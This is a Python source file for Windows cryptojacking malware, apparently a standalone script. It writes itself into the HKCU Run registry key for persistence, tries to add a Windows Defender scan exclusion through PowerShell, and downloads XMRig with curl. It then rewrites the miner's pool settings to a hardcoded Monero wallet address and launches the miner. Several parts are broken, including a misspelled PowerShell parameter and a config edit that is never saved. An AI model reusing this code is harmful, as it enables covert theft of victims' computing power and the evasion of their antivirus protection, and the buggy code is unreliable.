import os
import winreg as reg
import ctypes
import sys
import subprocess
import json

xmrig_download_path = os.path.expanduser('~\\AppData\\Local')
xmrig_version_name = os.listdir(os.path.join(xmrig_download_path, "/xmrig/"))

def get_persistance_and_priv():
    #! Startup + admin priv for windows systems
        
        #? Set up keys and paths
        key = r"Software\Microsoft\Windows\CurrentVersion\Run"
        app_name = os.path.basename(sys.argv[0])
        app_path = os.path.abspath(sys.argv[0])
        reg_path = r"HKCU\{}".format(key)

        try:
            # Check if the registry key already exists
            reg_key = reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_READ)
            value, regtype = reg.QueryValueEx(reg_key, app_name)
            reg.CloseKey(reg_key)

            # Check if the RunAsAdmin key already exists
            reg_key = reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_READ)
            value, regtype = reg.QueryValueEx(reg_key, f"{app_name}_RunAsAdmin")
            reg.CloseKey(reg_key)

            print(f"{app_name} is already set to run on startup and as administrator.")
        except FileNotFoundError:
            try:
                # If the registry key doesn't exist, create it
                reg_key = reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_SET_VALUE)
                reg.SetValueEx(reg_key, app_name, 0, reg.REG_SZ, app_path)
                reg.CloseKey(reg_key)

                # Check if the application has admin privileges
                if ctypes.windll.shell32.IsUserAnAdmin():
                    reg_key = reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_SET_VALUE)
                    reg.SetValueEx(reg_key, f"{app_name}_RunAsAdmin", 0, reg.REG_SZ, "1")
                    reg.CloseKey(reg_key)

                    print(f"{app_name} has been set to run as administrator during startup.")
                else:
                    print(f"{app_name} will run on startup, but it doesn't have admin privileges.")
            except Exception as e:
                print(f"Error occurred: {e}")

def get_av_exclusion():
    # Set the exclusion path, so that xmrig.exe is excluded from virus scanning by windows defender
    exclusion_path = os.path.join(xmrig_download_path, f"xmrig/{xmrig_version_name[0]}/xmrig.exe")

    # Run the command that adds the exclusion path to windows defender
    try:
        subprocess.run(["powershell", "Add-MpPreference -ExcusionPath", exclusion_path], check=True)
    except:
        return


def get_xmrig():
    subprocess.run(f"curl -o {xmrig_download_path}/xmrig.zip https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-msvc-win64.zip") # Get the binary
    subprocess.run(f"tar -xf {xmrig_download_path}/xmrig.zip") # Extract binary


def edit_xmrig_config():
    # Get the file path, and take the [0] index of the xmrig_version_name since it would be equal to the only available file in the dir
    xmrig_config = os.path.join(xmrig_download_path, f"/xmrig/{xmrig_version_name[0]}/config.json")

    # Open the config files, then exchange the ["pools"] part of the json file, with this new ["pools"] value
    with open(xmrig_config, "r+") as config_file:
        data = json.load(config_file)
        new_pools_value = {
            "url": None,
            "user": "82XPEyXycqBCi4pK5RfaThDeECNzXJGRMXMr5LzSgnxUVfB2Y3GRqm51CGAuoM252tdYRonMibMyyc8LvFUNsEmE8k5zwFS",
            "pass": "x",
            "rig-id": "optional_rig_identifier",
            "enabled": True
        }

        data["pools"] = new_pools_value
        config_file.close()

def run_xmrig():
    # Get the executable and config file, for the xmrig command
    xmrig_executable = os.path.join(xmrig_download_path, f"xmrig/{xmrig_version_name[0]}/xmrig.exe")
    xmrig_config = os.path.join(xmrig_download_path, f"xmrig/{xmrig_version_name[0]}/config.json")

    # Construct xmrig command
    try:
        subprocess.run(f"{xmrig_executable} -c {xmrig_config}")
    except:
        sys.exit()

def main():
    if os.name != "nt":
        return
    
    get_persistance_and_priv()
    get_av_exclusion()
    get_xmrig()
    edit_xmrig_config()
    run_xmrig()

if __name__ == "__main__":
    main()